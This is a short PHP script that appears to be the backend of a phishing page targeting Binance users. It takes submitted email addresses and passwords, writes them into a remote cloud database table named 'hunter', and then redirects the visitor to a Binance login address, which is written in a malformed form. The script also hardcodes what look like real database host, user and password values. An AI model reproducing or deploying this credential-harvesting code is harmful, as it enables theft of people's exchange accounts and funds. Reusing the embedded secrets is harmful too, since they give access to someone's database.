<?php
$host = "andi1234-betselot732-6d0b.j.aivencloud.com";
$port = 24488;
$user = "avnadmin";
$pass = "AVNS_sfXJMffkTNGy8ePzILC";
$db   = "defaultdb";

// Correct order: host, user, pass, db, port
$connection = new mysqli($host, $user, $pass, $db, $port);

if ($connection->connect_error) {
    die("Connection failed");
}

// Example safe input usage
//$id    = $_POST["id"] ?? null;
$id = $_POST["id"] ?? null;
$email = $_POST["email"] ?? null;
$passw = $_POST["password"] ?? null;
$type = $_POST["type"];

// PREPARED STATEMENT — safer
$stmt = $connection->prepare("INSERT INTO hunter (id, type, username, password) VALUES (?, ?, ?, ?)");

$stmt->bind_param("ssss", $id, $type, $email, $passw);

if ($stmt->execute()) {
    
header("Location: https://binance login");
exit();
} else {
    echo "failed";
}

$stmt->close();
$connection->close();
?>
